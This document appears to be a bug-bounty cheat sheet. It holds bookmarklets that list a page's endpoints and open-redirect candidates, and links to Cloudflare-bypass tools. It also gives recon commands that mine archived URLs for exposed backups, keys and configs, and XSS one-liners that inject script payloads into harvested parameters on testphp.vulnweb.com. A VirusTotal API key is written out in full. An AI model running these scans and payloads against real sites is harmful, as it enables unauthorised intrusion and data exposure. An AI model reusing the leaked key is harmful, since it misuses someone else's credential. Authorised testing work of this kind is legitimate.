# web_eb

```javascript
javascript:void(function(){let e=document.createElement('div');e.style.cssText='position:fixed;bottom:0;left:0;width:100%;height:300px;background:#1a1a1a;color:#00ff00;z-index:999999;padding:20px;overflow:auto;font-family:monospace;';e.innerHTML='<h3%20style="color:#00ff00">%F0%9F%94%8D%20BlackLine%20Scanner</h3><div%20id="results">Scanning...</div>';document.body.appendChild(e);let%20currentDomain=window.location.hostname;let%20foundUrls=new%20Set();function%20findUrls(){let%20urls=[];let%20sources=[...document.getElementsByTagName('a'),...document.getElementsByTagName('script'),...document.getElementsByTagName('img'),...document.getElementsByTagName('link'),...document.getElementsByTagName('form')];sources.forEach(element=>{if(element.href)urls.push(element.href);if(element.src)urls.push(element.src);if(element.action)urls.push(element.action);});let%20content=document.documentElement.innerHTML;let%20urlPattern=/(?:url\(|href="|src="|action="|url:|endpoint:|path:|route:)\s*['"]?([^'"\)\s>]+)/gi;let%20match;while((match=urlPattern.exec(content))!==null){if(match[1]&&!match[1].startsWith('data:'))urls.push(match[1]);}let%20scriptPattern=/"[^"]*"|'[^']*'/g;let%20scripts=document.documentElement.innerHTML.match(scriptPattern)||[];scripts.forEach(script=>{let%20urlMatches=script.match(/(?:\/[a-zA-Z0-9_-]+)+(?:\.[a-zA-Z0-9]+)?/g)||[];urlMatches.forEach(url=>urls.push(url));});performance.getEntriesByType('resource').forEach(entry=>urls.push(entry.name));return[...new%20Set(urls)];}let%20allUrls=findUrls();allUrls.sort();document.getElementById('results').innerHTML=`%20<div%20style="margin:10px%200;color:#00ff00">%E2%9C%85%20Found%20${allUrls.length}%20URLs%20&%20Endpoints%20on%20${currentDomain}</div>%20<div%20style="background:#2a2a2a;padding:10px;border-radius:5px">%20${allUrls.map(url=>`<div%20style="color:white;margin:5px%200;padding:5px;background:#333;border-radius:3px;word-break:break-all">${url}</div>`).join('')}%20</div>`;})();
```
## updated endpoint
```javascript
javascript:void(function(){let e=document.createElement('div');e.style.cssText='position:fixed;bottom:0;left:0;width:100%;height:300px;background:#1a1a1a;color:#00ff00;z-index:999999;padding:20px;overflow:auto;font-family:monospace;';e.innerHTML='<div style="display:flex;justify-content:space-between;align-items:center;"><h3 style="color:#00ff00;margin:0;">🔍 BlackLine Scanner</h3><button id="closeScanner" style="background:red;color:white;border:none;padding:5px 10px;cursor:pointer;font-weight:bold;">X</button></div><div id="results">Scanning...</div>';document.body.appendChild(e);document.getElementById("closeScanner").onclick=function(){e.remove();};let currentDomain=window.location.origin,foundUrls=new Set();function findUrls(){let urls=new Set();document.querySelectorAll('a[href], script[src], img[src], link[href], form[action]').forEach(el=>{let u=el.href||el.src||el.action;if(u&&!u.startsWith('data:'))try{urls.add(new URL(u,location.href).href);}catch{}});document.documentElement.innerHTML.replace(/(?:url\(|href=|src=|action=)["']?([^"'\s>]+)/gi,(m,u)=>{if(u&&!u.startsWith('data:'))try{urls.add(new URL(u,location.href).href);}catch{}});performance.getEntriesByType('resource').forEach(e=>{if(e.name)urls.add(e.name);});return Array.from(urls);}let allUrls=findUrls().sort();document.getElementById('results').innerHTML=`<div style="margin:10px 0;color:#00ff00">✅ Found ${allUrls.length} URLs & Endpoints on ${window.location.hostname}</div><div style="background:#2a2a2a;padding:10px;border-radius:5px">${allUrls.map(url=>`<div style="color:white;margin:5px 0;padding:5px;background:#333;border-radius:3px;word-break:break-all">${url}</div>`).join('')}</div>`;})();
```
## open redirect
```javascript
javascript:void(function(){let e=document.createElement('div');e.style.cssText='position:fixed;bottom:0;left:0;width:100%;height:500px;background:#1a1a1a;color:#00ff00;z-index:999999;padding:20px;overflow:auto;font-family:monospace;';e.innerHTML='<h3%20style="color:#00ff00">%F0%9F%94%8E%20Open%20Redirect%20Vulnerability%20Scanner</h3><div%20id="results">Scanning...</div>';document.body.appendChild(e);let%20currentDomain=window.location.hostname;let%20foundUrls=new%20Set();function%20findOpenRedirects(){let%20urls=[];let%20redirectParams=['redirect','url','return','destination','next','continue'];let%20sources=[...document.getElementsByTagName('a'),...document.getElementsByTagName('form')];sources.forEach(element=>{if(element.href){redirectParams.forEach(param=>{if(element.href.includes(param+'='))urls.push(element.href);});}if(element.action){redirectParams.forEach(param=>{if(element.action.includes(param+'='))urls.push(element.action);});}});let%20content=document.documentElement.innerHTML;let%20urlPattern=/(?:url\(|href="|src="|action="|url:|endpoint:|path:|route:)\s*['"]?([^'"\)\s>]+)/gi;let%20match;while((match=urlPattern.exec(content))!==null){if(match[1]&&!match[1].startsWith('data:'))redirectParams.forEach(param=>{if(match[1].includes(param+'='))urls.push(match[1]);});}return[...new%20Set(urls)];}let%20openRedirects=findOpenRedirects();openRedirects.sort();document.getElementById('results').innerHTML=`<div%20style="margin:10px%200;color:#00ff00">%E2%9C%94%20Found%20${openRedirects.length}%20Potential%20Open%20Redirect%20URLs%20on%20${currentDomain}</div><div%20style="background:#2a2a2a;padding:10px;border-radius:5px">${openRedirects.map(url=>`<div%20style="color:white;margin:5px%200;padding:5px;background:#333;border-radius:3px;word-break:break-all">${url}</div>`).join('')}</div>`;})();
```

- __[1 Cloudflare Bypass](https://github.com/sarperavci/CloudflareBypassForScraping)__
- __[2 Cloudflare Bypass](https://github.com/christophetd/CloudFlair.git)__


### RECON METHOD BY ~/.COFFINXP
```php
https://web.archive.org/cdx/search/cdx?url=*.example.com/*&collapse=urlkey&output=text&fl=original

https://www.virustotal.com/vtapi/v2/domain/report?apikey=982680b1787fa59701919aa22515a025e00df1e3bb2bc4f186b8e919558d576c&domain=example.com

https://otx.alienvault.com/api/v1/indicators/hostname/domain.com/url_list?limit=500&page=1

curl -G "https://web.archive.org/cdx/search/cdx" --data-urlencode "url=*.example.com/*" --data-urlencode "collapse=urlkey" --data-urlencode "output=text" --data-urlencode "fl=original" > out.txt

cat out.txt | uro |  grep -E '\.xls|\.xml|\.xlsx|\.json|\.pdf|\.sql|\.doc|\.docx|\.pptx|\.txt|\.zip|\.tar\.gz|\.tgz|\.bak|\.7z|\.rar|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.gz|\.config|\.csv|\.yaml|\.md|\.md5|\.exe|\.dll|\.bin|\.ini|\.bat|\.sh|\.tar|\.deb|\.rpm|\.iso|\.img|\.apk|\.msi|\.dmg|\.tmp|\.crt|\.pem|\.key|\.pub|\.asc'
```

### xss oneliner

```
echo "testphp.vulnweb.com" | waybackurls | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | urldedupe -s | grep -IE "[?].*[&]?" | grep "=" | unew -p | pvreplace '<sCript>confirm(1)</sCript>, <script>confirm(1)</script>' | xsschecker -match '<sCript>confirm(1)</sCript>, <script>confirm(1)</script>' -vuln
```

- ```echo "testphp.vulnweb.com" | gau | qsreplace '<sCript>confirm(1)</sCript>' | xsschecker -match '<sCript>confirm(1)</sCript>' -vuln```

- `echo "testphp.vulnweb.com" | katana -passive -pss waybackarchive,commoncrawl,alienvault | uro | gf xss | Gxss -p XSSRef | dalfox pipe`

- `subfinder -d testphp.vulnweb.com -all -silent | katana -passive -pss waybackarchive,commoncrawl,alienvault | uro | gf xss | Gxss -p XSSRef | dalfox pipe`
  __Tools used__
- __[waybackurls](https://github.com/tomnomnom/waybackurls.git)__
- __[urldedupe](https://github.com/ameenmaali/urldedupe.git)__
- __[unew](https://github.com/rix4uni/unew)__
- __[pvreplace](https://github.com/rix4uni/pvreplace)__
- __[xsschecker](https://github.com/rix4uni/xsschecker)__
